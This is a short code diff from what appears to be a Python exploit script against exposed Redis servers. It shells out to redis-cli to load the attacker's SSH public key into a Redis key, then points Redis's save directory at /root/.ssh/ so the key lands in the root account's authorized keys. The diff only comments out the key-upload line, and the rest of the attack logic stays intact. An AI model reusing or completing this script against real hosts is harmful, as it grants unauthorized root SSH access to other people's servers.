@@ -33,7 +33,7 @@ try:
     os.system(cmd)
     cmd2 = "cat $HOME/.ssh/public_key.txt | {} -h ".format(
         REDIS_CLI) + ip_address + " -p " + port + ' -x set cracklist'
-    os.system(cmd2)
+    # os.system(cmd2)
     cmd3 = cmd1 + ' config set dbfilename "backup.db" '
     if username == "root":
         cmd4 = cmd1 + ' config set  dir' + " /root" + "/.ssh/"
